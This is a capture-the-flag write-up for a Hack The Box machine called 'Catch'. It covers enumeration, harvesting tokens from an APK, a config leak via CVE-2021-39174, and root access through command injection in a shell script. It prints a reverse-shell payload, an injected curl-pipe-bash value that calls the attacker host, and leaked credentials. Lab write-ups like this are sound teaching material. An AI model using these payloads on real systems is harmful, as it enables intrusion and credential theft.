# Catch

---

## Enumeration & Foothold

- nmap TCP scan:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Catch Global Systems
3000/tcp open  ppp?
5000/tcp open  upnp?
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Catch Global Systems
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 69A0E6A171C4ED8855408ED902951594
```

- Feroxbuster dirscan result:

```
feroxbuster -u http://catch.htb -B -x php -n   

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://catch.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏦  Collect Backups       │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      374l      602w     6163c http://catch.htb/
403      GET        9l       28w      274c http://catch.htb/.php
301      GET        9l       28w      311c http://catch.htb/javascript => http://catch.htb/javascript/
200      GET      374l      602w     6163c http://catch.htb/index.php
403      GET        9l       28w      274c http://catch.htb/server-status
[####################] - 1m     60025/60025   0s      found:5       errors:1      
[####################] - 1m     60000/60000   575/s   http://catch.htb/
```

- Downloaded the offered file on the main domain's "port 80" home page, `.apk` file and started analyzing it using `jadx-gui`
- Found a subdomain `status.catch.htb` on main file `MainActivity`, but it returns the same page, nothing too interesting here.

```java
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
        WebView webView = (WebView) findViewById(R.id.webview);
        this.mywebView = webView;
        webView.setWebViewClient(new WebViewClient());
        this.mywebView.loadUrl("https://status.catch.htb/");
        this.mywebView.getSettings().setJavaScriptEnabled(true);
    }
```

- Found "potentially" API tokens for different apps on the box

```html
    <string name="gitea_token">b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0</string>
	<string name="slack_token">xoxp-23984754863-2348975623103</string>
	<string name="lets_chat_token">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==</string>
```

- A Gitea port info can be found in `/api/swagger`, but the token is invalid, tried all ways of using this token, but I have other tokens to try on other ports

```bash
curl http://10.10.11.150:3000/api/v1/user/repos -H "Authorization: token b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0" 
{"message":"token is required","url":"http://gitea.catch.htb:3000/api/swagger"}
```

- `Let's Chat` token worked. It's a Bearer auth token and now can hit API endpoints, they can be found [here](https://github.com/sdelements/lets-chat/wiki/API)

```bash
curl 10.10.11.150:5000/users -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="     
[{"id":"61b86aead984e2451036eb16","firstName":"Administrator","lastName":"NA","username":"admin","displayName":"Admin","avatar":"e2b5310ec47bba317c5f1b5889e96f04","openRooms":["61b86b28d984e2451036eb17","61b86b3fd984e2451036eb18","61b8708efe190b466d476bfb"]},{"id":"61b86dbdfe190b466d476bf0","firstName":"John","lastName":"Smith","username":"john","displayName":"John","avatar":"f5504305b704452bba9c94e228f271c4","openRooms":["61b86b3fd984e2451036eb18","61b86b28d984e2451036eb17"]},{"id":"61b86e40fe190b466d476bf2","firstName":"Will","lastName":"Robinson","username":"will","displayName":"Will","avatar":"7c6143461e935a67981cc292e53c58fc","openRooms":["61b86b3fd984e2451036eb18","61b86b28d984e2451036eb17"]},{"id":"61b86f15fe190b466d476bf5","firstName":"Lucas","lastName":"NA","username":"lucas","displayName":"Lucas","avatar":"b36396794553376673623dc0f6dec9bb","openRooms":["61b86b28d984e2451036eb17","61b86b3fd984e2451036eb18"]}]
```

- `/account` reveals that my token is the administrator user
- Enumerated the messages in all rooms, and found creds: `john:E}V!mywu_69T4C}W`, did not work for SSH, worked for port 8000 status app
- This instance is vulnerable to [CVE-2021-39174](https://github.com/n0kovo/CVE-2021-39174-PoC) and leaked the following data:

```bash
python leak.py -n john -p 'E}V!mywu_69T4C}W' -u http://10.10.11.150:8000

[+] Getting CSRF token
[+] CSRF token: 23cRLPpsXE3wVs8DyqOgd4dYCZv4YH7M0RITClOT
[+] Logging in as user 'john'
[+] Successfully logged in
[+] Getting current field values
[+] Sending payload
[+] Extracted the following values:
- APP_KEY               = base64:9mUxJeOqzwJdByidmxhbJaa74xh3ObD79OI6oG1KgyA=
- DB_DRIVER             = mysql
- DB_HOST               = localhost
- DB_DATABASE           = cachet
- DB_USERNAME           = will
- DB_PASSWORD           = s2#4Fg0_%3!
[+] Unsetting payload variable
[+] Exiting
```

- The previously gathered greds of `will:s2#4Fg0_%3!` is will's creds on the box, logged in via SSH and got user.txt

---

## PrivEsc

- Running `pspy64`, revealed a process running by root probably periodically

```bash
2022/12/26 05:09:02 CMD: UID=0    PID=67990  | /bin/bash /opt/mdm/verify.sh
```

- Linpeas:

```bash
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rwxr-x--x+ 1 root root 1894 Mar  3  2022 /opt/mdm/verify.sh
```

- The code in `verify.sh` is vulnerable to command injection in `app_check` function. So we'll have to pass the previous `comp_check` and `sig_check`.

```sh
app_check() {
        APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml")
        echo $APP_NAME
        if [[ $APP_NAME == *"Catch"* ]]; then
                echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
                mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
        else
                echo "[!] App doesn't belong to Catch Global"
                cleanup
                exit
        fi
}
```

- To exploit this, I used to previously downloaded APK file, decompiled it with `apktool`, then added the command injection in `<string name="Catch ....."></string>`
- First check is passed, `compileSdkVersion` is already 32, which is greater than 18

```bash
grep -oPm1 "(?<=compileSdkVersion=\")[^\"]+" "AndroidManifest.xml"            

32
```

- Prepared revshell paylaod:

```bash
cat game.sh            

#!/bin/bash
bash -i &> /dev/tcp/10.10.16.2/9001 0>&1
```

- In `/res/values/strings.xml`, I changed the app_name value to be:

```xml
<string name="app_name">Catch;$(curl http://10.10.16.2/game.sh | bash)</string>
```

- Built the apk file using `apktool` and dropped it in `apk_bin` folder, and got revshell as root!

```cmd
python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.150 - - [26/Dec/2022 02:17:12] "GET /game.sh HTTP/1.1" 200 -


nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.150] 38436
bash: cannot set terminal process group (115178): Inappropriate ioctl for device
bash: no job control in this shell
root@catch:~# 
```

---
